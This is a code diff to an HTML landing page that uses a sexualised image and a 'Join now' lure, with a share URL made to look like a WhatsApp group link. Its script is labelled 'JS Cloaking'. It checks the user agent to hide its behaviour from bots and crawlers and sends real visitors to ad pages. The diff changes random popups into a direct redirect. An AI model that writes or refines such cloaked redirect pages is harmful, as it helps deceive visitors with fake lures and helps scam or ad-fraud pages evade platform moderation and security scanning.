@@ -25,7 +25,7 @@
   <meta property="og:description" content="Join now">
   <meta property="og:image" content="https://w0.peakpx.com/wallpaper/323/12/HD-wallpaper-young-girl-sensual-female-models-sexy-people-beauty-face-lady-eyes.jpg">
   <meta property="og:type" content="website">
-  <meta property="og:url" content=" ">
+  <meta property="og:url" content="https://whatsappclick.wame.group.com">
 
   <style>
     body {
@@ -62,7 +62,7 @@
     <p>Waiting...</p>
   </div>
 
-  <!-- JS Cloaking + Random 3/4 Redirect -->
+  <!-- JS Cloaking + Random 1/2 Redirect -->
   <script>
     function isLikelyBot() {
       const ua = navigator.userAgent.toLowerCase();
@@ -91,18 +91,11 @@
 
     setTimeout(function () {
       if (!isLikelyBot()) {
-        const links = [
-          "ads.html",
-          "ads1.html",        
-        ];
-        const shuffled = shuffle(links).slice(0, 2); // lấy ngẫu nhiên 2 link
-        shuffled.forEach((link, index) => {
-          setTimeout(() => {
-            window.open(link, "_blank");
-          }, index * 400); // delay mở popup cách nhau một chút
-        });
+        const links = ["ads.html", "ads1.html"];
+        const randomLink = shuffle(links)[0];
+        window.location.href = randomLink;
       }
-    }, 800);
+    }, 1000);
   </script>
 </body>
 </html>
